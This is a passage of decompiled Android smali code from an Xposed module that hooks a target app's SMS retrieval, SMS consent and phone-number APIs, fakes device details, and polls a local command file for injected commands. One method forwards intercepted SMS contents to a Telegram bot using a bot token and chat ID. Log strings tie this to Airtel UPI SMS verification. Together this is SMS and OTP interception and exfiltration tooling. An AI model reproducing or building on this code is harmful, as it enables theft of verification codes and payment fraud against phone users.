    const-string v3, "AirtelHook: \u2713 Native UPI SMS verification fix installed"

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_9

    goto :goto_c

    .line 1592
    :catchall_9
    move-exception v3

    .line 1593
    .local v3, "t":Ljava/lang/Throwable;
    :try_start_12
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "AirtelHook: \u2717 Native hook failed: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v3}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1594
    .end local v3    # "t":Ljava/lang/Throwable;
    :goto_c
    goto :goto_d

    .line 1596
    :cond_e
    const-string v3, "AirtelHook: \u2717 Fix Airtel is DISABLED \u2014 skipping"

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_b

    .line 1615
    .end local v2    # "fixAirtelEnabled":Z
    :cond_f
    :goto_d
    :try_start_13
    invoke-static {v4}, Lcom/rebel/module/SmsLogDatabase;->setXposedContext(Z)V

    .line 1616
    iget-object v2, p0, Lcom/rebel/module/XposedHook;->context:Landroid/content/Context;

    invoke-static {v2}, Lcom/rebel/module/SmsLogDatabase;->getInstance(Landroid/content/Context;)Lcom/rebel/module/SmsLogDatabase;

    move-result-object v2

    iput-object v2, p0, Lcom/rebel/module/XposedHook;->database:Lcom/rebel/module/SmsLogDatabase;
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_0
    .catchall {:try_start_13 .. :try_end_13} :catchall_b

    .line 1619
    goto :goto_e

    .line 1617
    :catch_0
    move-exception v2

    .line 1625
    :goto_e
    :try_start_14
    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    new-instance v3, Lcom/rebel/module/XposedHook$12;

    invoke-direct {v3, p0}, Lcom/rebel/module/XposedHook$12;-><init>(Lcom/rebel/module/XposedHook;)V

    filled-new-array {v3}, [Ljava/lang/Object;

    move-result-object v3

    invoke-static {v1, v2, v0, v3}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 1635
    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v3, Ljava/lang/String;

    new-instance v4, Lcom/rebel/module/XposedHook$13;

    invoke-direct {v4, p0}, Lcom/rebel/module/XposedHook$13;-><init>(Lcom/rebel/module/XposedHook;)V

    filled-new-array {v3, v4}, [Ljava/lang/Object;

    move-result-object v3

    invoke-static {v1, v2, v0, v3}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_a

    .line 1646
    goto :goto_f

    .line 1644
    :catchall_a
    move-exception v0

    .line 1647
    :goto_f
    :try_start_15
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookSmsRetrieval(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1648
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookGmsSmsRetrieval(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1649
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookSmsUserConsentApi(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1650
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookCursorSmsReads(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1651
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookPhoneNumberMethods(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1654
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookDeviceFaker(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    :try_end_15
    .catchall {:try_start_15 .. :try_end_15} :catchall_b

    .line 1659
    goto :goto_10

    .line 1656
    :catchall_b
    move-exception v0

    .line 1660
    :goto_10
    return-void
.end method

.method synthetic lambda$addToBatch$1$com-src-module-XposedHook()V
    .locals 0

    .line 1058
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->sendBatchSummary()V

    return-void
.end method

.method synthetic lambda$handleInterceptedSms$0$com-src-module-XposedHook(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V
    .locals 3
    .param p1, "botToken"    # Ljava/lang/String;
    .param p2, "chatId"    # Ljava/lang/String;
    .param p3, "fDest"    # Ljava/lang/String;
    .param p4, "fMsg"    # Ljava/lang/String;
    .param p5, "fSrc"    # Ljava/lang/String;
    .param p6, "fLogId"    # J

    .line 265
    :try_start_0
    invoke-direct/range {p0 .. p7}, Lcom/rebel/module/XposedHook;->sendTelegramNotification(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V

    .line 266
    const-string v0, "SmsHook: Zet SMS forwarded to Telegram \u2713"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 269
    goto :goto_0

    .line 267
    :catch_0
    move-exception v0

    .line 268
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "SmsHook: Zet Telegram forward failed: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 270
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method synthetic lambda$startInjectMonitor$2$com-src-module-XposedHook()V
    .locals 7

    .line 1152
    const-wide/16 v0, 0x0

    .line 1155
    .local v0, "lastModified":J
    :goto_0
    const-wide/16 v2, 0x3e8

    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 1156
    new-instance v2, Ljava/io/File;

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getInjectCmdFile()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1157
    .local v2, "f":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x2

    cmp-long v3, v3, v5

    if-lez v3, :cond_0

    invoke-virtual {v2}, Ljava/io/File;->lastModified()J

    move-result-wide v3

    cmp-long v3, v3, v0

    if-lez v3, :cond_0

    .line 1158
    invoke-virtual {v2}, Ljava/io/File;->lastModified()J

    move-result-wide v3

    move-wide v0, v3

    .line 1159
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->processInjectCommand()V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 1163
    .end local v2    # "f":Ljava/io/File;
    :catch_0
    move-exception v2

    .line 1166
    :cond_0
    :goto_1
    goto :goto_0

    .line 1161
    :catch_1
    move-exception v2

    .line 1162
    .local v2, "ie":Ljava/lang/InterruptedException;
    nop

    .line 1168
    .end local v2    # "ie":Ljava/lang/InterruptedException;
    return-void
.end method
